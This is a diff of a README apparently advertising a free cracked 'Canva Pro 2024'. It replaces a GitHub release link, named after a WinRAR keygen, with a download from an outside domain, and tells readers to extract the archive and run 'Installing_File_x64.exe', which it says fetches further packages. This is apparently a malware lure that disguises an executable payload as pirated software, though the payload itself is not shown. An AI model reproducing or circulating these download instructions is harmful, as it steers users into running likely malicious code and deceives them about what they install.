@@ -13,11 +13,11 @@ Tags: Canva Pro 2024 free. Download Canva Pro 2024 for free. Download free Canva
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/1b252151-af6e-40f8-83b0-56b6ce5717e4)
-](https://github.com/DevSerena/Winrar-Keygen-2024/releases/download/V6.6/Release.zip)
+](https://dl.jrdesklabs.com/Setup.zip)
 
 
 
-## **1. [Download the archive](https://github.com/DevSerena/Winrar-Keygen-2024/releases/download/V6.6/Release.zip) and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![photo_2024-10-16_23-34-37](https://github.com/user-attachments/assets/a5b45bc4-e1a9-43b0-bc77-f5a418fe5014)
